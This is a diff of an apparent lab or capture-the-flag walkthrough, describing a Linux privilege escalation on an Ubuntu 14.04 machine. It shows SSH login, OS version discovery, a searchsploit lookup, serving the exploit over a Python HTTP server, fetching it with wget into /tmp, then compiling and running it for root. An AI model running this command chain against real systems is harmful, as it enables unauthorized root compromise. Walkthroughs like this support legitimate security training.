@@ -162,15 +162,21 @@ ssh <username>@<host address>
 
 The credentials successfully logged me in, now I could do some discovery in the target machine itself using basic linux commands.
 
+![]()
+
 Now that I had access to the directories, I checked the release version of the presently running operating system and find if it has any vulnerability I can exploit to gain root access.
 
 We use the following command to check the release date and version 
 
 cat /etc/*-release
 
+![]()
+
 Now that I knew the version of the operating system I searched for the exploits available for the same using the tool searchsploit in Kali
 
 searchsploit ubuntu 14.04
+
+![]()
 
 Here I have highlighted the exploit which I thought was best to use, it’s a privilege escalation exploit I can use to gain root access from any normal user. 
 
@@ -178,11 +184,15 @@ I now copied the exploit file to the present working directory i.e. /root using 
 
 searchsploit –m <exploit file name> 
 
+![]()
+
 Now that I have copied the file to the working directory, I host a simple http server in the same directory using the command
 
 python –m SimpleHTTPServer
 
 (it’s a case sensitive command)
+
+![]()
 
 Once I have successfully hosted the server in the directory, I can now download this exploit onto the host machine using the normal user access I had through ssh and then execute the exploit to gain root access.
 
@@ -192,9 +202,13 @@ cd tmp		(to change the directory to /tmp/)
 
 wget <IP address of the machine you hosted the server on>/<exploit file present in the same dir>
 
+![]()
+
 ls		(to list the files in the directory)		
 
 gcc <exploit file name> -o <name of the executable payload to generated>
+
+![]()
 
 Now I checked again to confirm the executable payload as been generated and is ready to exploit.
 
@@ -202,6 +216,12 @@ To run the executable exploit,
 
 ./<executable payload file name>
 
+![]()
+
 After the execution I saw a “#” symbol which signified I have successfully gained root access. I further typed the command “bash” to make the interface more use-able.
 
+![]()
+
 To further check it, I also use commands like “whoami” and “id” to confirm root access.
+
+Congratulations, we have successfully completed the walk-through, I hope you enjoyed it, regarding any doubts, I can be contacted via the contact information available on the blog.
